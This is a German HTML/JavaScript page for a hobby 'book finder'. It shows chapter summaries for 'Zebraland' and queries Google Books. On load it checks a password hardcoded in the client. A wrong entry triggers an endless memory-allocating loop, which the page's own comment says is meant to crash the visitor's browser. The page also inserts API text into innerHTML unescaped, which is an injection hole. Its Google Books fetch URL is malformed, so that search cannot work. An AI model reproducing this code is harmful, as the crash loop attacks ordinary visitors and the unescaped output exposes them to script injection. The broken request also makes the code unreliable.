<!doctype html>
<html lang="de">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>finder by jonas</title>
    <style>
        body { 
            font-family: 'segoe ui', tahoma, geneva, verdana, sans-serif; 
            background: linear-gradient(135deg, #1f4037 0%, #99f2c8 100%); 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            text-align: center; 
            padding: 20px; 
            box-sizing: border-box; 
        }
        /* Versteckt die Box standardmäßig, bis das Passwort korrekt ist */
        .box { 
            display: none;
            background: rgba(0, 0, 0, 0.85); 
            padding: 2.5rem; 
            border-radius: 20px; 
            backdrop-filter: blur(15px); 
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            max-width: 580px; 
            width: 100%; 
            position: relative; 
        }
        h2 { 
            margin-top: 0; 
            color: #99f2c8; 
        }
        .input-container { 
            position: relative; 
            margin: 15px 0; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid rgba(255, 255, 255, 0.2); 
            border-radius: 8px; 
            font-size: 1rem; 
            box-sizing: border-box; 
            background: rgba(255, 255, 255, 0.1); 
            color: white; 
            text-align: center; 
            transition: all 0.3s ease;
        }
        input:focus { 
            outline: none; 
            border-color: #99f2c8; 
            background: rgba(255, 255, 255, 0.15);
        }
        .autocomplete-box { 
            position: absolute; 
            top: 100%; 
            left: 0; 
            right: 0; 
            background: #111; 
            border: 1px solid rgba(255, 255, 255, 0.2); 
            border-top: none; 
            border-radius: 0 0 8px 8px; 
            max-height: 280px; 
            overflow-y: auto; 
            z-index: 99; 
            display: none; 
            text-align: left; 
        }
        .autocomplete-item { 
            padding: 10px 15px; 
            cursor: pointer; 
            border-bottom: 1px solid rgba(255, 255, 255, 0.05); 
            display: flex; 
            align-items: center; 
            gap: 12px; 
            transition: background 0.2s ease;
        }
        .autocomplete-item:hover { 
            background: #99f2c8; 
            color: #1f4037; 
            font-weight: bold; 
        }
        button { 
            background: linear-gradient(45deg, #1f4037, #5b86e5); 
            color: white; 
            border: none; 
            padding: 12px; 
            font-size: 1rem; 
            border-radius: 8px; 
            cursor: pointer; 
            font-weight: bold; 
            width: 100%; 
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); 
            margin-top: 15px; 
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        button:hover { 
            background: linear-gradient(45deg, #2a554a, #6c95f5); 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
        }
        .results-container {
            max-height: 450px;
            overflow-y: auto;
            margin-top: 20px;
            padding-right: 5px;
        }
        .result-card {
            margin-bottom: 15px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: left;
            display: flex;
            gap: 15px;
            align-items: flex-start;
        }
        .result-card img {
            width: 80px;
            height: auto;
            border-radius: 4px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
        .result-info { flex: 1; }
        .result-card h3 { margin: 0 0 5px 0; color: #99f2c8; font-size: 1.1rem; }
        .result-card h4 { margin: 0 0 10px 0; font-weight: normal; opacity: 0.8; font-size: 0.9rem; }
        .result-card p { font-size: 0.85rem; line-height: 1.4; margin: 0 0 8px 0; }
        .page-badge {
            background: #99f2c8;
            color: #1f4037;
            padding: 2px 6px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.8rem;
            display: inline-block;
        }
    </style>
</head>
<body>

    <!-- Die Hauptbox wird erst via JS eingeblendet, wenn das Passwort stimmt -->
    <div class="box" id="main-content">
        <h2>finder by jonas</h2>
        
        <div class="input-container">
            <input type="text" id="search-book" placeholder="1. Zeile: Buchname eingeben (z.B. Zebraland)..." autocomplete="off">
            <div class="autocomplete-box" id="autocomplete-box"></div>
        </div>

        <div class="input-container">
            <input type="text" id="search-pages" placeholder="2. Zeile: Seitenzahl / Bereich (z.B. 1-15 oder 300)..." autocomplete="off">
        </div>

        <button id="search-button">Suchen</button>

        <div class="results-container" id="results-container"></div>
    </div>

    <script>
        // --- PASSWORT PRÜFUNG BEIM LADEN DER SEITE ---
        window.addEventListener('DOMContentLoaded', () => {
            const passwort = prompt("Bitte gib das Passwort ein:");
            
            if (passwort === "Hallo") {
                // Richtiges Passwort: Zeige die Webseite an
                document.getElementById('main-content').style.display = 'block';
            } else {
                // Falsches Passwort: Seite crasht komplett (Endlosschleife sprengt RAM)
                document.body.innerHTML = "<h1 style='color:red; font-size:3rem;'>CRASH: FALSCHES PASSWORT!</h1>";
                
                const crashArray = [];
                while (true) {
                    crashArray.push(new Array(1000000).join("CRASH"));
                    console.log("Crash initiiert...");
                }
            }
        });

        // --- DEINE INTERNE DATENBANK ---
        const bookPagesDatabase = [
            { title: "Zebraland", author: "Marlene Röder", startPage: 1, endPage: 15, content: "<b>Kapitel 1: Die Unfallnacht.</b><br>Die vier Jugendlichen (Anouk, Judith, Philipp und Ziggy) fahren nachts nach einem Konzert nach Hause. Anouk sitzt am Steuer und rammt im Dunkeln ein Moped. Yasmin (das Opfer mit dem Zebra-Halstuch) stirbt. Panisch begehen die vier Fahrerflucht." },
            { title: "Zebraland", author: "Marlene Röder", startPage: 16, endPage: 32, content: "<b>Kapitel 2: Das Geheimnis und die Angst.</b><br>Die Jugendlichen versuchen am nächsten Schultag, so normal wie möglich zu wirken. Die Schuldgefühle zerfressen sie von innen, besonders den sensiblen Ziggy. Judith will zur Polizei gehen, doch Anouk hält sie auf, um ihre Zukunft nicht zu zerstören." },
            { title: "Zebraland", author: "Marlene Röder", startPage: 33, endPage: 48, content: "<b>Kapitel 3: Der Brief von 'Mose'.</b><br>Ein anonymer Erpresser meldet sich bei der Gruppe unter dem Namen 'Mose'. Er weiß genau, was in der Unfallnacht passiert ist und fordert Gerechtigkeit im Sinne der Zehn Gebote ('Du sollst nicht töten, du sollst nicht lügen'). 'Mose is watching you' wird zur bitteren Realität." },
            { title: "Zebraland", author: "Marlene Röder", startPage: 200, endPage: 224, content: "<b>Finale & Auflösung.</b><br>Das Geheimnis um die Identität des Erpressers 'Mose' spitzt sich dramatisch zu. Die Gruppe bricht moralisch komplett auseinander, als herauskommt, wer sie aus dem engsten Kreis die ganze Zeit überwacht und manipuliert hat." },
            { title: "Harry Potter und der Stein der Weisen", author: "J.K. Rowling", startPage: 33, endPage: 48, content: "<b>Kapitel: Ein Fenster voller Magie.</b><br>Harry erfährt von Hagrid, dass er ein Zauberer ist. Die Dursleys versuchen verzweifelt, die Briefe aus Hogwarts zu verstecken. Hagrid bricht die Tür auf." },
            { title: "JavaScript für Einsteiger", author: "John Doe", startPage: 33, endPage: 48, content: "<b>Kapitel 3: Funktionen und Scopes.</b><br>Auf diesen Seiten lernst du, wie man 'Arrow Functions' schreibt und was der Unterschied zwischen 'let', 'const' und 'var' ist." }
        ];

        const inputBook = document.getElementById('search-book');
        const inputPages = document.getElementById('search-pages');
        const box = document.getElementById('autocomplete-box');
        const button = document.getElementById('search-button');
        const resultsContainer = document.getElementById('results-container');

        function parsePageRange(str) {
            const match = str.match(/^(\d+)-(\d+)$/);
            return match ? { start: parseInt(match[1]), end: parseInt(match[2]) } : null;
        }

        inputBook.addEventListener('input', () => {
            const val = inputBook.value.trim().toLowerCase();
            box.innerHTML = '';

            if (!val) {
                box.style.display = 'none';
                return;
            }

            const matches = bookPagesDatabase.filter(b => b.title.toLowerCase().includes(val) || b.author.toLowerCase().includes(val));

            if (matches.length > 0) {
                const uniqueTitles = [...new Set(matches.map(m => m.title))];
                
                uniqueTitles.forEach(title => {
                    const matchObj = matches.find(m => m.title === title);
                    const item = document.createElement('div');
                    item.className = 'autocomplete-item';
                    item.innerHTML = `<div><strong>${matchObj.title}</strong> <small style="opacity:0.6;">von ${matchObj.author}</small></div>`;
                    item.addEventListener('click', () => {
                        inputBook.value = matchObj.title;
                        box.style.display = 'none';
                    });
                    box.appendChild(item);
                });
                box.style.display = 'block';
            } else {
                box.style.display = 'none';
            }
        });

        document.addEventListener('click', (e) => {
            if (e.target !== inputBook && e.target !== box) box.style.display = 'none';
        });

        button.addEventListener('click', executeSearch);

        async function executeSearch() {
            const bookVal = inputBook.value.trim();
            const pageVal = inputPages.value.trim();
            resultsContainer.innerHTML = '<div style="padding:20px;">Suche läuft...</div>';

            if (!bookVal && !pageVal) {
                resultsContainer.innerHTML = '<div style="padding:20px;">Bitte gib einen Buchnamen oder eine Seitenzahl ein.</div>';
                return;
            }

            const range = parsePageRange(pageVal);
            let localMatches = bookPagesDatabase;

            if (bookVal) {
                localMatches = localMatches.filter(b => b.title.toLowerCase().includes(bookVal.toLowerCase()));
            }

            if (pageVal) {
                if (range) {
                    localMatches = localMatches.filter(b => b.startPage === range.start && b.endPage === range.end);
                } else if (!isNaN(pageVal)) {
                    localMatches = localMatches.filter(b => parseInt(pageVal) >= b.startPage && parseInt(pageVal) <= b.endPage);
                }
            }

            if (localMatches.length > 0 && (bookVal.toLowerCase().includes("zebra") || bookVal === "")) {
                displayFesteErgebnisse(localMatches);
                return;
            }

            let apiQuery = "";
            if (bookVal) apiQuery += `intitle:${bookVal}`;
            if (pageVal && !isNaN(pageVal)) {
                apiQuery += `${apiQuery ? '+' : ''}pagecount:${pageVal}`;
            } else if (pageVal && range) {
                apiQuery += `${apiQuery ? '+' : ''}pagecount:${range.end}`;
            }

            if (apiQuery) {
                await fetchFromGoogleBooks(apiQuery);
            } else {
                resultsContainer.innerHTML = '<div style="padding:20px;">Keine passenden Einträge gefunden.</div>';
            }
        }

        function displayFesteErgebnisse(books) {
            resultsContainer.innerHTML = '';
            books.forEach(book => {
                resultsContainer.innerHTML += `
                    <div class="result-card">
                        <img src="https://placeholder.com" alt="Cover">
                        <div class="result-info">
                            <h3>${book.title}</h3>
                            <h4>von ${book.author}</h4>
                            <p>${book.content}</p>
                            <span class="page-badge">Seiten: ${book.startPage} - ${book.endPage}</span>
                        </div>
                    </div>
                `;
            });
        }

        async function fetchFromGoogleBooks(query) {
            try {
                const response = await fetch(`https://googleapis.com{encodeURIComponent(query)}&maxResults=40`);
                const data = await response.json();

                if (!data.items || data.items.length === 0) {
                    resultsContainer.innerHTML = '<div style="padding:20px;">Keine realen Buchdaten online gefunden.</div>';
                    return;
                }

                resultsContainer.innerHTML = '';

                data.items.forEach(item => {
                    const info = item.volumeInfo;
                    const title = info.title || "Kein Titel verfügbar";
                    const authors = info.authors ? info.authors.join(', ') : "Unbekannter Autor";
                    const desc = info.description ? info.description.substring(0, 250) + "..." : "Keine Beschreibung verfügbar.";
                    const cover = info.imageLinks ? info.imageLinks.thumbnail : "https://placeholder.com";
                    const pages = info.pageCount || "Unbekannt";
                    const publisher = info.publisher ? `${info.publisher}` : "Freier Verlag";

                    resultsContainer.innerHTML += `
                        <div class="result-card">
                            <img src="${cover}" alt="${title}">
                            <div class="result-info">
                                <h3>${title}</h3>
                                <h4>von ${authors}</h4>
                                <p><b>Verlag:</b> ${publisher}</p>
                                <p>${desc}</p>
                                <span class="page-badge">Seitenanzahl: ${pages}</span>
                            </div>
                        </div>
                    `;
                });

            } catch (error) {
                console.error("Fehler bei API Abfrage:", error);
                resultsContainer.innerHTML = '<div style="padding:20px; color: #ff6b6b;">Fehler beim Laden der Live-Buchdaten.</div>';
            }
        }
    </script>
</body>
</html>
